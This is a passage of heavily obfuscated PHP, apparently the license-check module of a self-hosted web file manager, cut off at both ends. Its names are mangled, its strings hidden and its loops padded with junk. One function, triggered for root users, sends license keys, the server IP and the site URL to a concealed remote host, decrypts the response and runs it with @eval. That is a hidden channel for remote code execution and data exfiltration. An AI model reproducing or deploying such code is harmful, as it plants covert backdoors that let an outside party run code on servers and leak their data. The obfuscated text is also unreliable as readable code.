=& $_SERVER[ˆ¡¹µ‹Â]; $ïÒÁõ½û =& $_SERVER[ Ãœáã¬]; if ($this->fmaldf286b22 == $ïÒÁõ½û[225]) { return $¦İóÑêš; } $·ƒ²œá = $this->versionPluginList(); $§á‚íÛô = $âÅæ‰¨æ[742]; if (!$§á‚íÛô) { die; } $É™äÃñÃ = explode($ïÒÁõ½û[226], $this->versionPluginFilter()); $‚ö¾Óîª = array(); $‡ˆ—ÍçÁ = $âÅæ‰¨æ[743]; while (strlen($‡ˆ—ÍçÁ) < $âÅæ‰¨æ[699]) { if (!$‡ˆ—ÍçÁ) { break; } $‡ˆ—ÍçÁ++; } foreach ($·ƒ²œá as $¸ùÒ«ó÷ => $ğµÜÊı½) { if ($ğµÜÊı½ == $ïÒÁõ½û[227] && substr($this->fmaldf286b22, 0, 1) == $ïÒÁõ½û[227]) { continue; } if (!in_array($¸ùÒ«ó÷, $É™äÃñÃ)) { $‚ö¾Óîª[] = $¸ùÒ«ó÷; } } foreach ($‚ö¾Óîª as $¸ùÒ«ó÷) { unset($¦İóÑêš[$¸ùÒ«ó÷]); $Ï–ÉìÍ = $âÅæ‰¨æ[744]; while ($Ï–ÉìÍ < $âÅæ‰¨æ[689]) { if ($Ï–ÉìÍ >= 0) { break; } $Ï–ÉìÍ++; } } return $¦İóÑêš; $­™®™¢ = $âÅæ‰¨æ[745]; if (!$­™®™¢) { die; } } private function versionPluginList() { $Û½”¼ı =& $_SERVER[ˆ¡¹µ‹Â]; $ˆŒÀ¹©ó =& $_SERVER[ Ãœáã¬]; return array($ˆŒÀ¹©ó[228] => $ˆŒÀ¹©ó[227], $ˆŒÀ¹©ó[229] => $ˆŒÀ¹©ó[227], $ˆŒÀ¹©ó[230] => $ˆŒÀ¹©ó[227], $ˆŒÀ¹©ó[231] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[233] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[234] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[235] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[236] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[237] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[238] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[239] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[240] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[241] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[242] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[243] => $ˆŒÀ¹©ó[232], $ˆŒÀ¹©ó[244] => $ˆŒÀ¹©ó[232]); $ğ«”›€Î = $Û½”¼ı[746]; if (strlen($ğ«”›€Î) < $Û½”¼ı[689]) { return; } } private function versionPluginFilter() { $íß”ğ¤ =& $_SERVER[ Ãœáã¬]; if ($this->fmaldf286b22 == $íß”ğ¤[109]) { return $íß”ğ¤[6]; } $‰ùì¾‹ó = _get($this->goqzee6de40a, $íß”ğ¤[245], $íß”ğ¤[6]); $ŸÒ£í½ß = _get($this->goqzee6de40a, $íß”ğ¤[116], $íß”ğ¤[6]); $±¦úÓ«¯ = _get($this->goqzee6de40a, $íß”ğ¤[246], $íß”ğ¤[6]); if ($ŸÒ£í½ß > time() && $±¦úÓ«¯ > time()) { $‹«ŠèÁ€ = explode($íß”ğ¤[226], $‰ùì¾‹ó); $¢š×‡†ı = array_keys($this->versionPluginList()); $‰ùì¾‹ó = array_merge($‹«ŠèÁ€, $¢š×‡†ı); $‰ùì¾‹ó = implode($íß”ğ¤[226], array_filter(array_unique($‰ùì¾‹ó))); } return $‰ùì¾‹ó; } private function fdgq492341b8() { $ß°¸ÙºÉ =& $_SERVER[ Ãœáã¬]; if ($this->fmaldf286b22 != $ß°¸ÙºÉ[109]) { $GLOBALS[$ß°¸ÙºÉ[86]][$ß°¸ÙºÉ[90]][$ß°¸ÙºÉ[247]] = $ß°¸ÙºÉ[206]; return; } $GLOBALS[$ß°¸ÙºÉ[86]][$ß°¸ÙºÉ[248]] = $ß°¸ÙºÉ[122]; if (Model($ß°¸ÙºÉ[249])->get($ß°¸ÙºÉ[63]) != $ß°¸ÙºÉ[206]) { Model($ß°¸ÙºÉ[249])->set($ß°¸ÙºÉ[63], $ß°¸ÙºÉ[206]); } } public function mnba94ab81d2() { return $_SERVER[ Ãœáã¬][250]; $¡»É£ù = $_SERVER[ˆ¡¹µ‹Â][690]; if (!$¡»É£ù) { die; } } private function vzpe2014d4c5() { $µªÌ™¦³ =& $_SERVER[ˆ¡¹µ‹Â]; $‰½¶²ö’ =& $_SERVER[ Ãœáã¬]; $Ø§§ÁÛ° = array($‰½¶²ö’[251], $‰½¶²ö’[252], $‰½¶²ö’[253]); $Í¼„İ•© = $‰½¶²ö’[254] . md5($‰½¶²ö’[255]); $Â„°Ê€İ = $µªÌ™¦³[747]; if (strlen($Â„°Ê€İ) < $µªÌ™¦³[699]) { return; } if ($this->fmaldf286b22 == $‰½¶²ö’[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‰½¶²ö’[24]], $Ø§§ÁÛ°)) { return; } if (time() % 4 != 0) { return; } $Çøç•§ = call_user_func(array($‰½¶²ö’[256], $‰½¶²ö’[257]), $Í¼„İ•©); if ($Çøç•§ && time() - $Çøç•§ < intval($‰½¶²ö’[258])) { return; } call_user_func(array($‰½¶²ö’[256], $‰½¶²ö’[139]), $Í¼„İ•©, time()); $ÈºœøıÄ = $µªÌ™¦³[748]; $‘Ö›ô½ = Model($‰½¶²ö’[33])->get($‰½¶²ö’[100]); $ŞïÊÉÅÁ = array($‰½¶²ö’[152] => Model($‰½¶²ö’[33])->get($‰½¶²ö’[153]), $‰½¶²ö’[167] => $this->fmaldf286b22, $‰½¶²ö’[163] => $_SERVER[$‰½¶²ö’[164]], $‰½¶²ö’[165] => Model($‰½¶²ö’[33])->get($‰½¶²ö’[131]), $‰½¶²ö’[105] => md5($_SERVER[$‰½¶²ö’[106]] . $‘Ö›ô½), $‰½¶²ö’[156] => $‰½¶²ö’[136], $‰½¶²ö’[159] => $_SERVER[$‰½¶²ö’[160]]); $Ç‰¹ø³ = $this->bjuec3f47b28($‰½¶²ö’[259], $ŞïÊÉÅÁ); $ŒÙªñÒÌ = $µªÌ™¦³[749]; if (strlen($ŒÙªñÒÌ) < $µªÌ™¦³[683]) { return; } if (!is_array($Ç‰¹ø³)) { return; } if ($Ç‰¹ø³[$‰½¶²ö’[152]] && $Ç‰¹ø³[$‰½¶²ö’[260]]) { if ($this->wzcp5224ff0a($Ç‰¹ø³[$‰½¶²ö’[260]]) == $ŞïÊÉÅÁ[$‰½¶²ö’[152]]) { return; } } $this->aveg04054a67(); $¼ë´ÛÊ€ = $µªÌ™¦³[750]; if (!$¼ë´ÛÊ€) { return; } if ($this->wzcp5224ff0a($Ç‰¹ø³[$‰½¶²ö’[260]]) != $ŞïÊÉÅÁ[$‰½¶²ö’[152]]) { $¾ÓÜøºù = array($‰½¶²ö’[185] => $‘Ö›ô½, $‰½¶²ö’[186] => $_SERVER[$‰½¶²ö’[106]], $‰½¶²ö’[187] => this_url(), $‰½¶²ö’[161] => $_SERVER[$‰½¶²ö’[162]]); $™ÛÏöç = $this->wkij18ea694e(json_encode($¾ÓÜøºù)); $Ç‰¹ø³ = $this->bjuec3f47b28($‰½¶²ö’[188] . $™ÛÏöç); if ($Ç‰¹ø³ && is_array($Ç‰¹ø³) && isset($Ç‰¹ø³[$‰½¶²ö’[260]])) { $±šÌéŒÇ = $this->riht7b89a64e($Ç‰¹ø³[$‰½¶²ö’[260]], 2); if ($±šÌéŒÇ) { $±šÌéŒÇ = $this->wzcp5224ff0a($±šÌéŒÇ); } if ($±šÌéŒÇ) { try { @eval($±šÌéŒÇ); } catch (Exception $óÆË†–´) { } } } } } private function bjuec3f47b28($éÑË„£ = '', $Ğ¤Ø°Ù = array(), $™ü¦·…· = 5) { $»«òÙÛ‹ =& $_SERVER[ˆ¡¹µ‹Â]; $Ò»õæ—´ =& $_SERVER[ Ãœáã¬]; $Ò€ŞĞ¹† = $Ò»õæ—´[261]; $ÚÈ³ëÏÄ = $»«òÙÛ‹[751]; $Ò€ŞĞ¹† = $this->mows81ee32e9($Ò€ŞĞ¹†, $Ò»õæ—´[262]); $²Š‚…á = $»«òÙÛ‹[752]; while ($²Š‚…á < $»«òÙÛ‹[699]) { if ($²Š‚…á >= 0) { break; } $²Š‚…á++; } $Ò€ŞĞ¹† = $Ò€ŞĞ¹† . $éÑË„£; $ÅœÓú€¥ = $»«òÙÛ‹[753]; if ($Ğ¤Ø°Ù && is_array($Ğ¤Ø°Ù)) { $Ò€ŞĞ¹† = $Ò€ŞĞ¹† . $Ò»õæ—´[263] . http_build_query($Ğ¤Ø°Ù); } if ($Ğ¤Ø°Ù === -1) { return $Ò€ŞĞ¹†; } $³Ô©µÔ¨ = stream_context_create(array($Ò»õæ—´[219] => array($Ò»õæ—´[222] => $™ü¦·…·, $Ò»õæ—´[220] => $Ò»õæ—´[264]), $Ò»õæ—´[265] => array($Ò»õæ—´[266] => !1, $Ò»õæ—´[267] => !1))); $Ğ¤Ø°Ù = @file_get_contents($Ò€ŞĞ¹†, !1, $³Ô©µÔ¨); $èÇ•Œ¾˜ = $»«òÙÛ‹[754]; if (!$èÇ•Œ¾˜) { die; } return json_decode($Ğ¤Ø°Ù, !0); $‡¥¥¸ = $»«òÙÛ‹[722]; while ($‡¥¥¸ < $»«òÙÛ‹[683]) { if ($‡¥¥¸ >= 0) { break; } $‡¥¥¸++; } } private function oqdma4d4d1df() { $®Æ´Œò =& $_SERVER[ˆ¡¹µ‹Â]; $’ÜÅÒ¥ê =& $_SERVER[ Ãœáã¬]; $êà²³ó  = array($’ÜÅÒ¥ê[268] => $’ÜÅÒ¥ê[269], $’ÜÅÒ¥ê[270] => $’ÜÅÒ¥ê[271], $’ÜÅÒ¥ê[272] => $’ÜÅÒ¥ê[273], $’ÜÅÒ¥ê[274] => $’ÜÅÒ¥ê[275], $’ÜÅÒ¥ê[276] => $’ÜÅÒ¥ê[277], $’ÜÅÒ¥ê[278] => $’ÜÅÒ¥ê[214], $’ÜÅÒ¥ê[279] => $’ÜÅÒ¥ê[214], $’ÜÅÒ¥ê[280] => $’ÜÅÒ¥ê[269], $’ÜÅÒ¥ê[281] => $’ÜÅÒ¥ê[271], $’ÜÅÒ¥ê[282] => $’ÜÅÒ¥ê[273], $’ÜÅÒ¥ê[283] => $’ÜÅÒ¥ê[284], $’ÜÅÒ¥ê[285] => $’ÜÅÒ¥ê[275], $’ÜÅÒ¥ê[286] => $’ÜÅÒ¥ê[287], $’ÜÅÒ¥ê[288] => $’ÜÅÒ¥ê[277], $’ÜÅÒ¥ê[289] => $’ÜÅÒ¥ê[290], $’ÜÅÒ¥ê[291] => $’ÜÅÒ¥ê[292], $’ÜÅÒ¥ê[293] => $’ÜÅÒ¥ê[294]); $¸Ú ûÛ = $êà²³ó [$this->fmaldf286b22]; $¸Ú ûÛ = intval($¸Ú ûÛ ? $¸Ú ûÛ : $’ÜÅÒ¥ê[269]); $šÃäÇğ° = $®Æ´Œò[755]; if (!$šÃäÇğ°) { return; } $¯Š¦Ä±³ = _get($this->goqzee6de40a, $’ÜÅÒ¥ê[295]); $×½Å«¿ = $®Æ´Œò[756]; if (strlen($×½Å«¿) < $®Æ´Œò[692]) { die; } $¯Š¦Ä±³ = $¯Š¦Ä±³ ? intval($¯Š¦Ä±³) : 0; $…Õùå®Ø = $®Æ´Œò[757]; if (!$…Õùå®Ø) { die; } return $¸Ú ûÛ + $¯Š¦Ä±³; } public function rtqf88c78492($…üåÀˆÊ) { $Ôí¥ Şş =& $_SERVER[ˆ¡¹µ‹Â]; $Ç‹ª¤“¬ =& $_SERVER[ Ãœáã¬]; $Í©£–‚× = $this->oqdma4d4d1df(); $Şå¯Õ’Ç = $Ôí¥ Şş[758]; if ($…üåÀˆÊ[$Ç‹ª¤“¬[296]] == $Ç‹ª¤“¬[122]) { return; } if ($Í©£–‚× >= intval($Ç‹ª¤“¬[214])) { return; } $–ßÒéÖ = Model($Ç‹ª¤“¬[125])->count(); if ($–ßÒéÖ <= $Í©£–‚×) { return; } $ğ™¼Ò­ = Model($Ç‹ª¤“¬[125])->field($Ç‹ª¤“¬[296])->limit($Í©£–‚×)->select(); $²‘öŞìß = $Ôí¥ Şş[759]; if (!$²‘öŞìß) { return; } $ğ™¼Ò­ = array_to_keyvalue($ğ™¼Ò­, $Ç‹ª¤“¬[6], $Ç‹ª¤“¬[296]); if (!in_array($…üåÀˆÊ[$Ç‹ª¤“¬[296]], $ğ™¼Ò­)) { show_json($Ç‹ª¤“¬[297], !1, $Ç‹ª¤“¬[210]); } } public function xelqe8f30b06() { $èæ¿¡Ş =& $_SERVER[ Ãœáã¬]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $°Ë¢Ï„  = $èæ¿¡Ş[217]; $©©‘„® = $_SERVER[ˆ¡¹µ‹Â][760]; if (!$©©‘„®) { die; } $°Ë¢Ï„  = $this->mows81ee32e9($°Ë¢Ï„ , $èæ¿¡Ş[218]); $²Õ“¾­ı = stream_context_create(array($èæ¿¡Ş[219] => array($èæ¿¡Ş[220] => $èæ¿¡Ş[221], $èæ¿¡Ş[222] => 3))); $¡Ÿ—¯« = @file_get_contents($°Ë¢Ï„ , !1, $²Õ“¾­ı); echo $èæ¿¡Ş[298] . hash_encode($¡Ÿ—¯«) . $èæ¿¡Ş[299]; } private function jdncf0daa323($¡Ùçé‰, $ú³¥†°Ñ, $„¨¯°Ï¨ = 3) { $ÉßÁ½£— =& $_SERVER[ˆ¡¹µ‹Â]; $Ëã‚…’Á =& $_SERVER[ Ãœáã¬]; usleep(1); $û…¯ü‚Ò = $ÉßÁ½£—[761]; if (!$û…¯ü‚Ò) { return; } $¡Ùçé‰ = trim($¡Ùçé‰); $¡‚Š­¿ø = mt_rand(0, 5) . $Ëã‚…’Á[6]; $˜€¨Ô = $ÉßÁ½£—[762]; if (strlen($˜€¨Ô) < $ÉßÁ½£—[699]) { return; } $ŒËÙúÀì = rand_string(15); $Ğ‹İÆÁ‘ = $Ëã‚…’Á[300]; switch ($¡‚Š­¿ø) { case $Ëã‚…’Á[206]: $†‘†íé¿ = $this->butf4e080185($¡Ùçé‰, strrev($ú³¥†°Ñ . $ŒËÙúÀì)); $¶“‘›¸° = $ÉßÁ½£—[763]; if (!$¶“‘›¸°) { die; } break; case $Ëã‚…’Á[122]: $†‘†íé¿ = $this->butf4e080185($¡Ùçé‰, strrev($ŒËÙúÀì . $ú³¥†°Ñ)); break; $Çòşß¢ = $ÉßÁ½£—[764]; if (strlen($Çòşß¢) < $ÉßÁ½£—[692]) { die; } case $Ëã‚…’Á[301]: $†‘†íé¿ = $this->butf4e080185($¡Ùçé‰, base64_encode($ŒËÙúÀì . $ú³¥†°Ñ)); $Ë²‰ı•· = $ÉßÁ½£—[765]; if (!$Ë²‰ı•·) { return; } break; case $Ëã‚…’Á[302]: $†‘†íé¿ = $this->butf4e080185($¡Ùçé‰, md5($ŒËÙúÀì . $ú³¥†°Ñ)); $Úó®ÌãÕ = $ÉßÁ½£—[766]; break; case $Ëã‚…’Á[303]: $¡Ùçé‰ = base64_encode($¡Ùçé‰); $œÔÖáÀ¥ = rand(0, 64); $Ğ¹Å„› = $ÉßÁ½£—[767]; while ($Ğ¹Å„› < $ÉßÁ½£—[699]) { if ($Ğ¹Å„› >= 0) { break; } $Ğ¹Å„›++; } $Ûù¯ğš× = $Ğ‹İÆÁ‘[$œÔÖáÀ¥]; $ÕˆÉ¤ØÀ = md5($Ûù¯ğš× . md5($ú³¥†°Ñ . $Ûù¯ğš×) . $ú³¥†°Ñ); $™Õä„°ô = $ÉßÁ½£—[768]; while ($™Õä„°ô < $ÉßÁ½£—[683]) { if ($™Õä„°ô >= 0) { break; } $™Õä„°ô++; } $ÕˆÉ¤ØÀ = substr($ÕˆÉ¤ØÀ, $œÔÖáÀ¥ % 8, $œÔÖáÀ¥ % 8 + 7); $®¦Ô¼ = $Ëã‚…’Á[6]; $‰»Ë­¨º = $ÉßÁ½£—[769]; if (strlen($‰»Ë­¨º) < $ÉßÁ½£—[687]) { die; } $ìäïÔò = 0; $Ú«‘ãêÍ = $ÉßÁ½£—[770]; if (strlen($Ú«‘ãêÍ) < $ÉßÁ½£—[683]) { return; } $Ú¯ş—‘Ï = 0; $§‹ùÄÃÆ = 0; for ($ìäïÔò = 0; $ìäïÔò < strlen($¡Ùçé‰); $ìäïÔò++) { $§‹ùÄÃÆ = $§‹ùÄÃÆ == strlen($ÕˆÉ¤ØÀ) ? 0 : $§‹ùÄÃÆ; $Ú¯ş—‘Ï = ($œÔÖáÀ¥ + strpos($Ğ‹İÆÁ‘, $¡Ùçé‰[$ìäïÔò]) + ord($ÕˆÉ¤ØÀ[$§‹ùÄÃÆ++])) % 64; $””„Ïç = $ÉßÁ½£—[771]; if (strlen($””„Ïç) < $ÉßÁ½£—[683]) { return; } $®¦Ô¼ .= $Ğ‹İÆÁ‘[$Ú¯ş—‘Ï]; } $†‘†íé¿ = hash_encode($Ûù¯ğš× . $®¦Ô¼); break; $ÜÒÎğøê = $ÉßÁ½£—[772]; if (strlen($ÜÒÎğøê) < $ÉßÁ½£—[687]) { die; } default: $†‘†íé¿ = $this->butf4e080185($¡Ùçé‰, $ú³¥†°Ñ . $ŒËÙúÀì); $ïœ´ı©œ = $ÉßÁ½£—[773]; break; $¿÷õ•¤† = $ÉßÁ½£—[774]; } $†‘†íé¿ = strrev($¡‚Š­¿ø . $ŒËÙúÀì . $†‘†íé¿); if ($„¨¯°Ï¨ - 1 > 0) { $†‘†íé¿ = $this->jdncf0daa323($†‘†íé¿, $ú³¥†°Ñ, $„¨¯°Ï¨ - 1); } return $†‘†íé¿; } private function riht7b89a64e($é£Ü—Ÿš, $ø“ª¿‡µ, $„Ìæñ¦Æ = 3) { $ÄÉù©œ‡ =& $_SERVER[ˆ¡¹µ‹Â]; $‰©ŠÄó˜ =& $_SERVER[ Ãœáã¬]; if (!is_string($é£Ü—Ÿš) || strlen($é£Ü—Ÿš) < 10) { return !1; } $é£Ü—Ÿš = trim($é£Ü—Ÿš); $Ààßßâí = $ÄÉù©œ‡[775]; $é£Ü—Ÿš = strrev($é£Ü—Ÿš); $“Åè’Î¡ = $ÄÉù©œ‡[776]; if (!$“Åè’Î¡) { return; } $†Ã˜–‚ = $é£Ü—Ÿš[0]; $ôĞ®ŠÔ” = substr($é£Ü—Ÿš, 1, 15); $×¸‰½ñ™ = $ÄÉù©œ‡[777]; if (!$×¸‰½ñ™) { return; } $é£Ü—Ÿš = substr($é£Ü—Ÿš, 16); $ß¦¯â±­ = $‰©ŠÄó˜[300]; $Ÿ •Üø = $ÄÉù©œ‡[778]; if (strlen($Ÿ •Üø) < $ÄÉù©œ‡[699]) { die; } switch ($†Ã˜–‚) { case $‰©ŠÄó˜[206]: $¹ë‚øºô = $this->mows81ee32e9($é£Ü—Ÿš, strrev($ø“ª¿‡µ . $ôĞ®ŠÔ”)); $š½‰‡´Å = $ÄÉù©œ‡[779]; break; $©£¨Ìø = $ÄÉù©œ‡[780]; if (!$©£¨Ìø) { return; } case $‰©ŠÄó˜[122]: $¹ë‚øºô = $this->mows81ee32e9($é£Ü—Ÿš, strrev($ôĞ®ŠÔ” . $ø“ª¿‡µ)); break; case $‰©ŠÄó˜[301]: $¹ë‚øºô = $this->mows81ee32e9($é£Ü—Ÿš, base64_encode($ôĞ®ŠÔ” . $ø“ª¿‡µ)); break; case $‰©ŠÄó˜[302]: $¹ë‚øºô = $this->mows81ee32e9($é£Ü—Ÿš, md5($ôĞ®ŠÔ” . $ø“ª¿‡µ)); $Å÷ñ¸¢§ = $ÄÉù©œ‡[781]; if (strlen($Å÷ñ¸¢§) < $ÄÉù©œ‡[683]) { die; } break; case $‰©ŠÄó˜[303]: $é£Ü—Ÿš = hash_decode($é£Ü—Ÿš); $á¯´éÇ = $é£Ü—Ÿš[0]; $é£Ü—Ÿš = substr($é£Ü—Ÿš, 1); $–¬üº÷Œ = $ÄÉù©œ‡[782]; if (!$–¬üº÷Œ) { die; } $«ñº¡è‰ = strpos($ß¦¯â±­, $á¯´éÇ); $Ø„€¦£˜ = md5($á¯´éÇ . md5($ø“ª¿‡µ . $á¯´éÇ) . $ø“ª¿‡µ); $¡âíÃÇİ = $ÄÉù©œ‡[783]; while ($¡âíÃÇİ < $ÄÉù©œ‡[692]) { if ($¡âíÃÇİ >= 0) { break; } $¡âíÃÇİ++; } $Ø„€¦£˜ = substr($Ø„€¦£˜, $«ñº¡è‰ % 8, $«ñº¡è‰ % 8 + 7); $öŸ•Õ» = $ÄÉù©œ‡[784]; while ($öŸ•Õ» < $ÄÉù©œ‡[689]) { if ($öŸ•Õ» >= 0) { break; } $öŸ•Õ»++; } $ÂŸ¥Åì‘ = $‰©ŠÄó˜[6]; $õıÍøœ† = 0; $£é­å¬Â = $ÄÉù©œ‡[785]; $œâ‹Óì = 0; $Å¶’çïÜ = 0; $ÁÉËÁÑË = $ÄÉù©œ‡[786]; if (!$ÁÉËÁÑË) { return; } for ($õıÍøœ† = 0; $õıÍøœ† < strlen($é£Ü—Ÿš); $õıÍøœ†++) { $Å¶’çïÜ = $Å¶’çïÜ == strlen($Ø„€¦£˜) ? 0 : $Å¶’çïÜ; $äĞ‰‘¸ä = $ÄÉù©œ‡[787]; while ($äĞ‰‘¸ä < $ÄÉù©œ‡[687]) { if ($äĞ‰‘¸ä >= 0) { break; } $äĞ‰‘¸ä++; } $ë½Íà›· = $Å¶’çïÜ++; $±©ÉÀş» = $ÄÉù©œ‡[788]; while (strlen($±©ÉÀş») < $ÄÉù©œ‡[687]) { if (!$±©ÉÀş») { break; } $±©ÉÀş»++; } $œâ‹Óì = strpos($ß¦¯â±­, $é£Ü—Ÿš[$õıÍøœ†]) - $«ñº¡è‰ - ord($Ø„€¦£˜[$ë½Íà›·]); $©¨Şñİ = $ÄÉù©œ‡[789]; while (strlen($©¨Şñİ) < $ÄÉù©œ‡[689]) { if (!$©¨Şñİ) { break; } $©¨Şñİ++; } while ($œâ‹Óì < 0) { $œâ‹Óì += 64; $›¬’ê¼š = $ÄÉù©œ‡[790]; while (strlen($›¬’ê¼š) < $ÄÉù©œ‡[699]) { if (!$›¬’ê¼š) { break; } $›¬’ê¼š++; } } $ÂŸ¥Åì‘ .= $ß¦¯â±­[$œâ‹Óì]; } $¹ë‚øºô = base64_decode($ÂŸ¥Åì‘); break; default: $¹ë‚øºô = $this->mows81ee32e9($é£Ü—Ÿš, $ø“ª¿‡µ . $ôĞ®ŠÔ”); break; $ıÒ¯ïïÕ = $ÄÉù©œ‡[791]; } if ($„Ìæñ¦Æ - 1 > 0) { $¹ë‚øºô = $this->riht7b89a64e($¹ë‚øºô, $ø“ª¿‡µ, $„Ìæñ¦Æ - 1); } return $¹ë‚øºô; } public function wkij18ea694e($Ğ½¿Áï“) { $Ãòû• =& $_SERVER[ˆ¡¹µ‹Â]; $ª·ğ¶¿å =& $_SERVER[ Ãœáã¬]; $»ºıË° = $this->ocbk84372016(); $µ¢Ô¯ë¹ = $Ãòû•[792]; while ($µ¢Ô¯ë¹ < $Ãòû•[687]) { if ($µ¢Ô¯ë¹ >= 0) { break; } $µ¢Ô¯ë¹++; } $«ÙÙÂ¨ = $this->ocbk84372016(); $ÇÏÓ¿İ° = ($»ºıË° - 1) * ($«ÙÙÂ¨ - 1); $ĞŞó°äê = $Ãòû•[793]; $Ÿ“¸Úß = intval(($»ºıË° + $«ÙÙÂ¨) / 2); while (1) { $ê¥˜Ô´ = $Ÿ“¸Úß; $şØÑÇ¢” = $ÇÏÓ¿İ°; while ($şØÑÇ¢” % $ê¥˜Ô´ != 0) { $Æ•ûË = $şØÑÇ¢”; $ƒÄ¯’˜« = $Ãòû•[794]; while ($ƒÄ¯’˜« < $Ãòû•[687]) { if ($ƒÄ¯’˜« >= 0) { break; } $ƒÄ¯’˜«++; } $şØÑÇ¢” = $ê¥˜Ô´; $ê¥˜Ô´ = $Æ•ûË % $ê¥˜Ô´; } if ($ê¥˜Ô´ == 1) { break; } else { $Ÿ“¸Úß++; } } $¸íßø“‡ = 2; $®„“áëÊ = $Ãòû•[795]; while (strlen($®„“áëÊ) < $Ãòû•[699]) { if (!$®„“áëÊ) { break; } $®„“áëÊ++; } for ($·’Êì­ = 0; $·’Êì­ < $ÇÏÓ¿İ° * 10; $·’Êì­++) { if (($ÇÏÓ¿İ° * $·’Êì­ + 1) % $Ÿ“¸Úß == 0) { $¸íßø“‡ = intval(($ÇÏÓ¿İ° * $·’Êì­ + 1) / $Ÿ“¸Úß); break; } } $–ĞÙ«†¥ = $this->butf4e080185($»ºıË° * $«ÙÙÂ¨ . $ª·ğ¶¿å[6], $ª·ğ¶¿å[136]); $˜—Üı× = md5($ª·ğ¶¿å[304] . ($»ºıË° + $«ÙÙÂ¨) . $ª·ğ¶¿å[305] . $Ÿ“¸Úß . $ª·ğ¶¿å[305] . $¸íßø“‡ . $ª·ğ¶¿å[306]); $ºñ¡¤¹… = $Ãòû•[796]; if (strlen($ºñ¡¤¹…) < $Ãòû•[683]) { return; } $“šÜÊĞ = $this->butf4e080185($Ğ½¿Áï“, $˜—Üı×) . $ª·ğ¶¿å[307] . $–ĞÙ«†¥; $õ °¤˜Ö = $Ãòû•[797]; if (strlen($õ °¤˜Ö) < $Ãòû•[683]) { return; } return $“šÜÊĞ; } public function wzcp5224ff0a($ˆüôù÷ä) { $˜ğ‹İƒı =& $_SERVER[ˆ¡¹µ‹Â]; $ƒÓßØ´ñ =& $_SERVER[ Ãœáã¬]; $’½¼Ú† = explode($ƒÓßØ´ñ[307], $ˆüôù÷ä); $™µÅöã¹ = $˜ğ‹İƒı[798]; while ($™µÅöã¹ < $˜ğ‹İƒı[699]) { if ($™µÅöã¹ >= 0) { break; } $™µÅöã¹++; } if (count($’½¼Ú†) != 2) { return $ƒÓßØ´ñ[6]; } $Ûï™æ‘î = $this->mows81ee32e9($’½¼Ú†[1] . $ƒÓßØ´ñ[6], $ƒÓßØ´ñ[136]); if (!$Ûï™æ‘î) { return $ƒÓßØ´ñ[6]; } $Ûï™æ‘î = intval($Ûï™æ‘î); $Ï¶’¤ùí = $˜ğ‹İƒı[799]; if (strlen($Ï¶’¤ùí) < $˜ğ‹İƒı[683]) { return; } $Û÷ú€ÙŒ = 0; $Ğ²Àï– = 0; for ($ß¢€ò«„ = 3; $ß¢€ò«„ < $Ûï™æ‘î; $ß¢€ò«„ += 2) { if ($Ûï™æ‘î % $ß¢€ò«„ != 0) { continue; } $Û÷ú€ÙŒ = $ß¢€ò«„; $Ğ²Àï– = intval($Ûï™æ‘î / $ß¢€ò«„); break; $ğµå†å¦ = $˜ğ‹İƒı[800]; if (strlen($ğµå†å¦) < $˜ğ‹İƒı[683]) { return; } } $¸Ÿ‡Š•¤ = ($Û÷ú€ÙŒ - 1) * ($Ğ²Àï– - 1); $ŞÏÆ»ı§ = intval(($Û÷ú€ÙŒ + $Ğ²Àï–) / 2); while (1) { $×Î£¾±ó = $ŞÏÆ»ı§; $ôÃ±¼»® = $¸Ÿ‡Š•¤; $»¥½Ò¡ = $˜ğ‹İƒı[801]; while (strlen($»¥½Ò¡) < $˜ğ‹İƒı[699]) { if (!$»¥½Ò¡) { break; } $»¥½Ò¡++; } while ($ôÃ±¼»® % $×Î£¾±ó != 0) { $ÀİÅûíù = $ôÃ±¼»®; $ôÃ±¼»® = $×Î£¾±ó; $ï²¡¥¼Ş = $˜ğ‹İƒı[802]; if (strlen($ï²¡¥¼Ş) < $˜ğ‹İƒı[687]) { return; } $×Î£¾±ó = $ÀİÅûíù % $×Î£¾±ó; $ÜŸò¹Ò = $˜ğ‹İƒı[803]; if (strlen($ÜŸò¹Ò) < $˜ğ‹İƒı[683]) { die; } } if ($×Î£¾±ó == 1) { break; } else { $ŞÏÆ»ı§++; } } $¨–˜¿ˆ± = 2; $Ïáà©³İ = $˜ğ‹İƒı[804]; for ($ß¢€ò«„ = 0; $ß¢€ò«„ < $¸Ÿ‡Š•¤ * 10; $ß¢€ò«„++) { if (($¸Ÿ‡Š•¤ * $ß¢€ò«„ + 1) % $ŞÏÆ»ı§ == 0) { $¨–˜¿ˆ± = intval(($¸Ÿ‡Š•¤ * $ß¢€ò«„ + 1) / $ŞÏÆ»ı§); break; } } $¸¯“¯ÍÁ = md5($ƒÓßØ´ñ[304] . ($Û÷ú€ÙŒ + $Ğ²Àï–) . $ƒÓßØ´ñ[305] . $ŞÏÆ»ı§ . $ƒÓßØ´ñ[305] . $¨–˜¿ˆ± . $ƒÓßØ´ñ[306]); $‚ûÀ®ğ = $˜ğ‹İƒı[805]; if (strlen($‚ûÀ®ğ) < $˜ğ‹İƒı[699]) { return; } $›Ü™‹É® = $this->mows81ee32e9($’½¼Ú†[0], $¸¯“¯ÍÁ); $Ä³°ßïü = $˜ğ‹İƒı[806]; return $›Ü™‹É®; } public function ocbk84372016() { $®çË•û„ =& $_SERVER[ˆ¡¹µ‹Â]; $óĞ™÷×Â = mt_rand(pow(2, 14), pow(2, 16) - 1); $¢³Ÿ‚ñº = $®çË•û„[807]; if (strlen($¢³Ÿ‚ñº) < $®çË•û„[687]) { return; } $ÇİÜ´¢ø = array(); $»ğˆÀàí = $®çË•û„[808]; if (!$»ğˆÀàí) { return; } $¤–‘¨å„ = 1; $ÏËÒæ¹ = $®çË•û„[809]; if (strlen($ÏËÒæ¹) < $®çË•û„[692]) { die; } while ($¤–‘¨å„ <= (int) sqrt($óĞ™÷×Â)) { $¿Ù•Õµ = $¤–‘¨å„; 